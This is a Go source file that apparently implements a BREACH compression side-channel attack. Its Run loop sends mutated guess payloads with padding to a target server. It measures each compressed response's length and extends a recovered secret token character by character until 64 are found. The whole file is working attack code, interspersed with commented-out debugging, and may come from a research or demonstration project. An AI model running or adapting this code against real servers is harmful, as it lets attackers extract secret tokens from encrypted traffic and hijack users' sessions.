package cryptopener

import (
	"log"
	"io/ioutil"
	"os"
	//"math"
	"math/rand"
	"time"

	client "github.com/larikuistio/cryptopener/client"
)

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client *client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	ResultToken string
}

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string) *Cryptopener {
	cryptopener := Cryptopener{
		client: client.NewClient(address, entry),
		mutator: NewMutator(),
	}
	return &cryptopener
}

func (p *Cryptopener) analyseResponse(response []byte) int {
	filename := "/tmp/tmpfile"
	ioutil.WriteFile(filename, response, os.FileMode(0666))
	fi, _ := os.Stat(filename)
	size := fi.Size()
	os.Remove(filename)
	log.Printf("Filesize: %d", size)
	return int(size)
}

func createPadding() string {
	dummy_chars := "!#&%$*+-(){}"
	ret := ""
	for i := 0; i < 8; i++ {
		ret = ret + string(dummy_chars[rand.Intn(11)])
	}
	return ret
}

func Pow(x int, n int) int {
	var ret int
	if n == 0 {
		ret = 1
	} else {
		ret = x
		for i := 0; i < n - 1; i++ {
			ret = x * ret
		}
	}
	return ret
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	rand.Seed(time.Now().Unix())
	dummy_chars := "!#&%$*+-(){}"
	checkBaseLength := true
	base_length := 0
	temp_length := 0
	correct_count := 0
	x := 1
	y := 0
	p.ResultToken = ""
	padding := ""
	for {
		var payload []byte
		y = 0
		//log.Printf("y == %d", y)
		/*for i := 1; i <= x; i++ {
			log.Printf("Pow == %d", Pow(p.mutator.tokenCount, i))
			y = y + Pow(p.mutator.tokenCount, i)
			log.Printf("y == %d", y)
		}*/
		y = Pow(p.mutator.tokenCount, x)
		//log.Printf("int(y) == %d", int64(y))

		if checkBaseLength {
			// create new payload
			//log.Printf("len(cBL) %d", int(math.Floor(float64(p.mutator.mutations / int64(y)))) + 1)
			//for i := 0; i < int(math.Floor(float64(p.mutator.mutations / int64(y)))) + 1; i++ {
			for i := 0; i < x; i++ {
				payload = []byte(string(payload) + string(dummy_chars[rand.Intn(11)]))
			}
			//log.Printf("cBL %s", string(payload))
			payload = []byte(p.ResultToken + string(payload))
			log.Printf("Sending payload: %s", string(payload))
			// send payload into a socket and then response into channel
			response := p.client.SendMessage(string(payload), padding)
			base_length = p.analyseResponse(response)
			//log.Printf("checkBaseLength == TRUE, %d", base_length)
			checkBaseLength = false
		} else {
			// create new payload
			/*if p.mutator.mutations == 248 {
				var sum int
				for _, i := range p.mutator.tokenMap {
					sum += int(i.index % p.mutator.tokenCount)
				}
				log.Printf("sum == %d", sum)
			}*/

			/*var sum int
			for _, i := range p.mutator.tokenMap {
				sum += int(i.index % p.mutator.tokenCount)
			}
			log.Printf("sum == %d", sum)
			log.Printf("lastIndexPos == %d", p.mutator.lastIndexPos)
			mutationsCount := int64(0)
			for i := 0; i <= p.mutator.lastIndexPos; i++ {
				log.Printf("mutationsCount == %d", mutationsCount)
				mutationsCount += int64(Pow(p.mutator.tokenCount, p.mutator.lastIndexPos))
			}
			log.Printf("mutationsCount == %d", mutationsCount)
			*/
			mutpayload, _ := p.mutator.NewPayload(false)
			payload = []byte(p.ResultToken + string(mutpayload))
			log.Printf("Sending payload: %s", string(payload))
			// send payload into a socket and then response into channel
			response := p.client.SendMessage(string(payload), padding)
			temp_length = p.analyseResponse(response)
			//log.Printf("p.mutator.mutations == %d", p.mutator.mutations)
			//log.Printf("int64(y) == %d", int64(y))
			if temp_length < base_length {
				p.ResultToken = string(p.ResultToken) + string(mutpayload)
				p.mutator = NewMutator()
				checkBaseLength = true
				correct_count++
				x = 1
			} else if p.mutator.mutations - int64(y) == 0 {
				//log.Printf("temp_length >= base_length")
				x++
				//log.Printf("x == %d", x)
				//log.Printf(string(payload))
				checkBaseLength = true
				if x % 2 == 0 {
					padding = padding + createPadding()
				}
			}
		}

		if correct_count == 64 {
			log.Printf("The guessed token is %s", p.ResultToken)
			break
		}
	}
}
